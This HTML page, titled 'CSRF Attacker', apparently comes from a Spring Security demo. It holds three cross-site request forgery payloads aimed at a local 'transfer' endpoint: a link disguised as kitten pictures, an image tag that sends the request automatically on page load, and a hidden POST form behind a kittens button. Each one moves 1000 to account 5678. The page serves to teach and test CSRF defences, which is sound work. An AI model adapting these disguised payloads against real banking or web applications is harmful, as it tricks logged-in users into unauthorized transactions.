<html>
<head></head>

<body>
<h1>CSRF Attacker</h1>
<a href="http://localhost:8080/spring-security-rest-full/transfer?accountNo=5678&amount=1000">Show Kittens Pictures</a>

<img src="http://localhost:8080/spring-security-rest-full/transfer?accountNo=5678&amount=1000"/>

<form action="http://localhost:8080/spring-security-rest-full/transfer" method="POST">
    <input name="accountNo" type="hidden" value="5678"/>
    <input name="amount" type="hidden" value="1000"/>
    <input type="submit" value="Show Kittens Picture">
</form>
</body>
</html>